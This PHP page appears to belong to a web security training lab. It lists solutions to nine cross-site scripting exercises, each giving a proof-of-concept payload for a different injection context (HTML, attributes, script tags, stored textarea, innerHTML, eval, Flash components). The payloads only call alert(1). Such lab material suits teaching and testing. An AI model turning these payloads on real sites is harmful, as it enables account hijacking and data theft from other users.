<?php
	$menu_main = 'solutions';
	$menu_sub = 'error_based_solutions';
	include_once('../php-inc/header.php');
?>
      
      <!-- **********************************************************************************************************************************************************
      MAIN CONTENT
      *********************************************************************************************************************************************************** -->
      <!--main content start-->
      <section id="main-content">
          <section class="wrapper">
          	<h3><i class="fa fa-angle-right"></i>XSS Injection Solutions</h3>
				<div class="row">
				
	                  <div class="col-md-12">
	                  	  <div class="content-panel">
	                  	  	  <h4><i class="fa fa-angle-right"></i> Example</h4>
	                  	  	  <hr>
		                      <table class="table">
		                          <thead>
		                          <tr>
		                              <th>#</th>
		                              <th>Code &amp Details</th>
		                          </tr>
		                          </thead>
		                          <tbody>
		                          	<tr>
		                              <td>1</td>
		                              <td><strong>XSS输出在HTML中的情况</strong><br/><br/>
                                          ?name=&lt;script&gt;alert(1);&lt;/script&gt;
		                              </td>
		                          	</tr>
			                      	<tr>
                                        <td>2</td>
                                        <td><strong>XSS输出在HTML属性中的情况</strong><br/><br/>
			                              	?name=2" onclick="alert(1);
                                        </td>
			                      	</tr>	
			                      	<tr>
                                        <td>3</td>
                                        <td><strong>XSS输出在script标签中的情况</strong><br/><br/>
                                            ?name=3&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;
                                        </td>
			                      	</tr>	
			                      	<tr>
                                        <td>4</td>
                                        <td><strong>XSS在input value中的情况</strong><br/><br/>
                                            在输入框内输入:&lt;script&gt;alert(1);&lt;/script&gt;
                                        </td>
			                      	</tr>	
			                      	<tr>
                                        <td>5</td>
                                        <td><strong>XSS输出在textarea中的情况</strong><br/><br/>
                                            将&lt;script&gt;alert(1);&lt;/script&gt;写入数据库中，其他人访问后弹出
                                        </td>
			                      	</tr>	
			                      	<tr>
                                        <td>6</td>
                                        <td><strong>XSS通过innerHTML输出的情况</strong><br/><br/>
                                            ?name=6&lt;img src=1 onerror=alert(1)&gt;
                                        </td>
			                      	</tr>	
			                      	<tr>
                                        <td>7</td>
                                        <td><strong>XSS通过eval执行的情况</strong><br/><br/>
                                            #alert(1);
                                        </td>
			                      	</tr>
                                    <tr>
                                        <td>8</td>
                                        <td><strong>XSS Flash Jplaey</strong><br/><br/>
                                            修改xml文件
                                            &lt;menu name="日 志" href="构造点\&quot;))}catch(e){alert(1)}//构造点" /&gt;
                                            再次上传文件，打开
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>9</td>
                                        <td><strong>XSS Flash swfupload</strong><br/><br/>
                                            ?movieName=9"])}catch(e){alert(1)};//
                                        </td>
                                    </tr>
		                          </tbody>
		                      </table>
	                  	  </div><! --/content-panel -->
	                  </div><!-- /col-md-12 -->
	      			</div>
          </section>
      </section>

      <!--main content end-->

<?php
	include_once('../php-inc/footer.php');
?>